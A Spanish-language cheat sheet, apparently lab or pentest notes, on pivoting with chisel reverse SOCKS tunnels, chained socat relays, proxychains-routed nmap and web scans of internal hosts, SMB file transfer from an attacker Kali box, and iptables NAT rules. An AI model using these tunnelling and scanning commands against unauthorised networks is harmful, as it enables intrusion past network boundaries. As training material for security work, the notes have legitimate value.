---
title: 'Chisel Port Forwarding'
description: ''
pubDate: 'May 12 2023'
slug: 'network/port_forwarding'
---

```powershell
# target_1
# si queremos que nos traiga todos lo puertos
chisel client server_ip:server_port R:127.0.0.1:socks
#chisel client kali_ip:1234 R:80:target_2:80
chisel client kali_ip:port R:socks

# KALI
# CONFIGURATIONS
# nano /etc/proxychains.conf
strict_chain
# habilitar si hay dos o mas conexiones y deshabilitar static
# dynamic_chain

# añadir nuevos segmentos... de abajo hacia arrbina
# socks5 127.0.0.1 8888
socks5 127.0.0.1 1080 # POner el puerto que te habra el server chisel
chisel server --reverse -p 1234
chisel server --reverse --socks5 -p 1234
# Ahora llegamos con proxychains

proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n target_2

#xargs añadir hilos
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n target_2 2>&1 | grep "open"

## Ver en que puerto andamos
ps -faux | grep nmap | tails -n2 | head -n 1

proxychains whatweb target_2
# Configurar foxyproxy
# -> proxy type socks5
# -> proxy id 127.0.0.1
# -> chisel port
gobuster --proxy socks5://127.0.0.1

## Nos traemos el puerto 443 por ejemplo que en este caso es http3 que funciona con el protocolo udp
chisel client kali_ip:1234 R:443:target_2:443/udp

# hacer curl a http3 -> cloudflare/quiche
# http-client3

# Ver de target_3 a target_2 y a kali
target_2 ./socat TCP-LISTERN:4343,fork TCP:target_2-interface1 (192.168.111.106:80)

# EN la kali
python3 -m http.server 80

tcpdump -i eth0 port ftp or ftp-data

```

## Tranfer Files

Listamos lo que esta en nuestra maquina pasando por otras

```powershell
# transferir archivo de kali a makina3
# kali -> itermediario -> makina3
# Makina 3
$ dir \\kali\smbFolder

# intermediario
socat TCP-LISTEN:445,fork TCP:kali:445
# si hay mas maquinas
# socat TCP-LISTEN:445,fork TCP:kali:445

# Kali smb abre el puerto 445 por defecto
smbserver.py smbFolder $(pwd) -smb2support

```

**_CHISEL_**

```powershell
# target_1
#chisel client kali_ip:1234 R:80:target_2:80
chisel client kali_ip:port R:socks

# KALI
# nano /etc/proxychains.conf
strict_chain
# dynamic_chain

socks5 127.0.0.1 1080 # POner el puerto que te habra el server chisel

# KALI # UDP
chisel server --reverse -p 1234

# ip_1
./socat TCP-LISTEN:6542,fork TCP:kali_ip:1234

# ip_2
./socat TCP-LISTEN:6543, fork TCP:ip_1:6542

# ip_3
./chisel.exe client ip_2:6543 R:9999:socks

# proxychains
#
#
# socks5 127.0.0.1 9999
# socks5 ...
# socks5 ...
# socks5 ...
# SI quieres ver un servidor http: foxyproxy[type->socks5;port->9999]
iptables -t nat -A PREROUTING -p tcp --dport 55555 -j DNAT --to-destination 10.185.10.34:80

iptables -t nat -A POSTROUTING -j MASQUERADE
```
